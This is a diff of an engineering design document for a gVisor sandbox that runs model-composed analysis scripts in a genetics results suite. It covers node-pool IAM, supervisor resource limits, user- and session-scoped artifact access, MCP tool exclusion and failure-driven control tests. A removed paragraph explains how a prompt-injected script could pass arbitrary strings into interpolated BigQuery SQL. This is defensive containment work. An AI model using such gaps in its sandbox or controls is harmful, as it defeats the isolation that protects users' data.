-| `4h6.10` (node pool) | New pinned 1-node gVisor pool; primary pool budget untouched; ForceNew does not apply because this is a new resource. **Unconditional `workload_metadata_config { mode = "GKE_METADATA" }`, which requires making `google_container_cluster.primary`'s `workload_identity_config` unconditional as well** (an in-place cluster update; it does not change existing pools' metadata mode) — without it the pool is rejected **at apply, not at plan**. A dedicated minimal node service account (not `genetics-suite`, not the Compute Engine default), **mandatory as an input under `manage_iam = false` with no `null` fallback**, carrying `logging.logWriter`, `monitoring.metricWriter`, `monitoring.viewer`, `stackdriver.resourceMetadata.writer`, `artifactregistry.reader`. Explicit `oauth_scopes` — `devstorage.read_only` (required for Artifact Registry pulls; the IAM role alone is not sufficient), `logging.write`, `monitoring`, `monitoring.write`, `service.management.readonly`, `servicecontrol`, `trace.append` — as defence for the `GCE_METADATA` misconfiguration case only, **not** as a bound on pod-facing tokens. Review gate is source inspection of those three properties plus a `manage_iam = false` apply, not a plan diff. |
-| `4h6.39`, `4h6.41`–`4h6.43`, `4h6.45`–`4h6.46` (the supervisor) | 60s/120s wall clock, 64 KiB head+tail output cap, 8 MiB pipe cap, concurrency 1 with queue, `/scratch/<execution-id>` as the only writable path (temp included), **no pod-level `/tmp` — and therefore no `/tmp` wipe; the wipe-before-every-fork obligation applies *only if* the `/tmp` volume is re-added as the recorded degradation in section 2**, unrecognised `/scratch` entries wiped at startup, child pid budget and `RLIMIT_AS` per the pids and memory rows, supervisor-enforced per-execution and aggregate `/scratch` quotas so the `emptyDir` `sizeLimit` is never reached (section 2, "Staying under `sizeLimit`"), and the ownership contract in section 2's "Permission contract" if the second-uid pids option is taken. **Startup assertions in the supervisor, before it accepts any execution:** `/etc/nsswitch.conf` exists and lists `files` before `dns` — section 3(b) requires this as a cheap backstop to `4h6.6`'s build-time check, and no other task owns it — and `prewarm()` called before the first fork and before any privilege drop, letting its `PrewarmError` crash the pod rather than catching it. **The wire shape itself — `GET /health`, `POST /execute`, every field, its type, and what happens when it is absent or malformed — is section 2's "The HTTP contract between chat-backend and the supervisor" (`4h6.38`); `4h6.39` and `4h6.47` implement the two ends of it and cannot share a module, so that subsection is the only definition.** The two numbers this row does **not** span sit inside the range it used to be titled with: `4h6.40` is the local Docker backend (section 2, "As built") and `4h6.44` the SDK's switch to the per-execution token — neither is supervisor work, so do not re-broaden the title to `4h6.39`–`4h6.46`. |
-| `4h6.48` (`run_analysis`) | Response contract: `run_analysis` returns the artifact manifest (see the `read_artifact` subsection in section 6). Its MCP exclusion is the `4h6.16` row's first correction below. |
-| `4h6.15` (`read_artifact`) | Takes an artifact **name**, never a path and never a model-supplied execution id; chat-backend resolves it server-side against executions owned by the requesting **user and** chat session — the `(sub, sid)` pair, since `sid` arrives in the request body and authorizes nothing on its own (`genetics-results-suite-dh3`) — and `404` otherwise. The tool carries `run_analysis`'s gateway-asserted gate (`4h6.84`), without which `sub` would be as forgeable as `sid` to any holder of `INTERNAL_API_SECRET`. Proxies over HTTP to the sandbox — **the proxy hop and the sid-scoped resolution landed in `genetics-results-suite-4h6.52`, not in this task, which shipped a descriptor-based LOCAL read that has since been removed**; the structural checks run **inside the sandbox pod** against `/scratch/<id>/artifacts`, and `SUBAGENT_ALLOWED_PATHS` (which is `/data`, the chat-data PVC) never gains a reader. `/scratch/<id>/artifacts` retained 5 minutes after completion, everything else deleted immediately, subject to the per-execution 64Mi artifact quota and the aggregate retained ceiling with oldest-first eviction (section 2, "Staying under `sizeLimit`"). Resolution depends on `run_analysis` returning an **artifact manifest** (`name`, `size`, `content_type` per file, no paths, no execution id) that chat-backend records against the `jti` under the requesting `(sub, sid)` pair; **name collisions within one `(sub, sid)` key resolve to the most recently completed still-retained execution that produced the name.** See the `read_artifact` subsection in section 6. |
-| `4h6.16` (MCP exclusion) | Three independent layers, and the tests must enumerate the live tool list rather than the constant. `TOOL_PROFILE` is **not** a control here: mcp-server passes no profile and therefore registers everything not in `_mcp_disabled`. Two things the row previously got wrong, both corrected in section 5: `run_analysis`'s exclusion landed with **`4h6.48`**, not `4h6.16`; and the registration layer has **two** controls, since `run_analysis` has no `@mcp.tool()` block at all and `disabled_tools` can only subtract. The asked-for "no HTTP route reaches the sandbox client" assertion ships as an **import-graph** assertion on `genetics_mcp_server.mcp_server` — equivalent while `chat_api` is a separate app that is never mounted, and it must be rewritten as route enumeration if that ever changes. |
+Two conventions run through those harnesses and are what make them evidence rather than
+ritual. **A control is driven as the failure**: every group that asserts a hazard is closed also
+restores the defect — usually by swapping in the pre-fix source, selected by a
+`SUPERVISOR_TEST_*` environment variable — and asserts the same probe then goes red. Several of
+those checks passed vacuously before their control existed. And **anything about a hang is
+driven on a thread with a deadline**, so a regression fails the check rather than wedging the
+harness.
 
-**One finding outside this document's scope that other tasks need.** Several executor methods
-build BigQuery SQL by interpolation, because db-api's `/query` takes a SQL string with no
-parameter-binding channel. Under the tool surface those f-strings receive arguments the
-*model* chose through a typed tool schema; once the SDK is called from inside a script they
-receive arguments a *script* composed — arbitrary strings, from a prompt-injectable author,
-which is why this is a prerequisite for the sandbox path rather than a hygiene item.
-`genetics-results-suite-4h6.11` listed the fix in its scope and **closed without being the
-thing that delivered it**; what closes it today is `tools/sql_safety.py` in genetics-mcp-server
-(a value allow-list, not escaping — `quote_literal`, `sql_int`, `sql_float`), plus
-`executor._seg()` for the URL-path segments. Re-verify that against the code before relying
-on it: no open bead owns these sites, so nothing will report a regression.
+What is **not** covered: the live connection test from the mcp-server pod to the sandbox
+Service, and whether Dataplane V2 enforces egress to a link-local address on this cluster. Both
+need a deployed cluster and neither has been run.
